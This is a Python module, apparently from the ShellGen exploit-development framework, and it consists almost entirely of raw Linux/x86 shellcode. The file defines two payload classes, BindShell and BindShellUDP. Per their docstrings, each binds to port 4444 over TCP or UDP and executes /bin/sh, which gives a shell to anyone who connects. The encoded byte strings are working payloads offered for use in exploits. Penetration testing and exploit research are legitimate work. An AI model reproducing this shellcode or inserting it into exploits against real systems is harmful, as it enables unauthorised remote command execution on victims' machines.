#!/usr/bin/env python

###############################################################################
## Bind to TCP port 4444 and execute /bin/sh in Linux/x86                    ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2013 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Bind to TCP port 4444 and execute /bin/sh."

__all__ = ["BindShell"]

from shellgen import Static

class BindShell (Static):
    """
    "Bind to TCP port 4444 and execute /bin/sh in Linux/x86.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "termnull"

    port = 4444

    bytes = (
        "\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x81\x9c\x95"
        "\xe9\x83\xeb\xfc\xe2\xf4\xb0\x47\xc6\xaa\xd2\xf6\x97\x83\xe7\xc4\x0c\x60"
        "\x60\x51\x15\x7f\xc2\xce\xf3\x81\x90\xc0\xf3\xba\x08\x7d\xff\x8f\xd9\xcc"
        "\xc4\xbf\x08\x7d\x58\x69\x31\xfa\x44\x0a\x4c\x1c\xc7\xbb\xd7\xdf\x1c\x08"
        "\x31\xfa\x58\x69\x12\xf6\x97\xb0\x31\xa3\x58\x69\xc8\xe5\x6c\x59\x8a\xce"
        "\xfd\xc6\xae\xef\xfd\x81\xae\xfe\xfc\x87\x08\x7f\xc7\xba\x08\x7d\x58\x69"
        "\x00"
    )

class BindShellUDP (Static):
    """
    "Bind to UDP port 4444 and execute /bin/sh in Linux/x86.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "termnull"

    port = 4444

    bytes = (
        "\x33\xc9\x83\xe9\xe7\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x13\xec\x81"
        "\xca\x83\xeb\xfc\xe2\xf4\x22\x37\xd2\xa0\x11\x86\x83\x89\x79\x8a\xd9\x43"
        "\xf2\x21\x01\x59\x4a\x5c\xbe\x07\x93\xa5\xf8\x33\x48\xb6\xe9\xb5\x13\xec"
        "\x80\xac\x7b\xfd\xdd\xac\x40\x65\x60\xa0\x03\xbd\xd2\x43\xf2\xaf\x31\xac"
        "\xde\x6c\xeb\xc1\x4b\xbe\xe7\xa2\x3e\x85\x08\x2b\x79\x8b\xe7\xa2\x7a\x82"
        "\xe9\xaf\x77\x85\xf5\xa2\x3e\xc1\xef\xa5\x9a\x0b\xd3\xa2\x3c\xc3\xf2\xa2"
        "\x7b\xc3\xe3\xa3\x7d\x65\x62\x98\x42\xbb\xd2\x43\xf2\x21\x01\xca\x00"
    )
